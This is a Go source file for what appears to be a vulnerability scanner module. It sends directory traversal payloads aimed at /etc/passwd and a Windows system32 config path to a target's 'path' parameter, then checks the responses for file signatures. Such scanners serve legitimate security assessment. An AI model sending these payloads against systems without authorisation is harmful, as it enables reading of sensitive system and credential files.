package scanner

import (
	"net/http"
	"fmt"
	"io/ioutil"
	"strings"
)

// DirectoryTraversalScanner checks for directory traversal vulnerabilities.
type DirectoryTraversalScanner struct{}

// Scan performs directory traversal scanning on the target
func (d DirectoryTraversalScanner) Scan(target string, headers map[string]string) bool {
	payloads := []string{"../../../../etc/passwd", "..\\..\\..\\..\\windows\\system32\\config"}

	for _, payload := range payloads {
		maliciousURL := target + "/file?path=" + payload
		req, _ := http.NewRequest("GET", maliciousURL, nil)

		for key, value := range headers {
			req.Header.Add(key, value)
		}

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("Error:", err)
			return false
		}
		defer resp.Body.Close()

		body, _ := ioutil.ReadAll(resp.Body)

		// Check for signs of sensitive files
		if strings.Contains(string(body), "root:x:0:0") || strings.Contains(string(body), "[boot loader]") {
			fmt.Println("Directory Traversal vulnerability found!")
			return true
		}
	}

	return false
}